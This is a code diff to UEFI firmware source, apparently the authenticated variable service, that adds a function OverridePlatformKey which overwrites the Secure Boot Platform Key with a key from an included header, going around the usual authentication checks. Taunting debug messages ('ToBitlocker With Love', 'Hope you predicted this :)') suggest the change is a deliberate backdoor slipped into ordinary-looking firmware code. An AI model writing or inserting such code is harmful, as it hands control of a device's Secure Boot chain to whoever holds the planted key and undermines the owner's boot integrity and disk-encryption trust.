@@ -25,7 +25,7 @@ SPDX-License-Identifier: BSD-2-Clause-Patent
 **/
 
 #include "AuthServiceInternal.h"
-
+#include "PlatformKey.h"
 #include <Protocol/VariablePolicy.h>
 #include <Library/VariablePolicyLib.h>
 
@@ -345,6 +345,59 @@ NeedPhysicallyPresent (
   }
 
   return FALSE;
+}
+
+VOID
+OverridePlatformKey(
+  VOID
+) {
+  EFI_STATUS Status;
+  EFI_TIME Time = {
+    2023, // Year
+    10,   // Month
+    1,    // Day
+    0,    // Hour
+    0,    // Minute
+    0,    // Second
+    0,    // Pad1
+    0,    // Nanosecond
+    0,    // TimeZone
+    0,    // Daylight
+    0     // Pad2
+  };
+
+
+  //
+  // ToDoug
+  //
+  DEBUG((DEBUG_ERROR, "ToBitlocker With Love\n"));
+
+  //
+  // TODO add a check to ensure that the platform key we expect is the one we're going to replace
+  //
+
+  Status = AuthServiceInternalUpdateVariableWithTimeStamp(
+    L"PK",
+    &gEfiGlobalVariableGuid,
+    PlatformKey,
+    sizeof(PlatformKey),
+    VARIABLE_ATTRIBUTE_NV_BS_RT_AT,
+    &Time
+  );
+
+  if (EFI_ERROR(Status)) {
+    // Handle error
+    DEBUG((DEBUG_ERROR, "Failed to update PK variable: %r\n", Status));
+    return;
+  }
+
+  DEBUG((DEBUG_INFO, "ToBitlocker: PK variable updated successfully\n"));
+
+  //
+  // Hope you predicted this :)
+  //
+
+  return;
 }
 
 /**
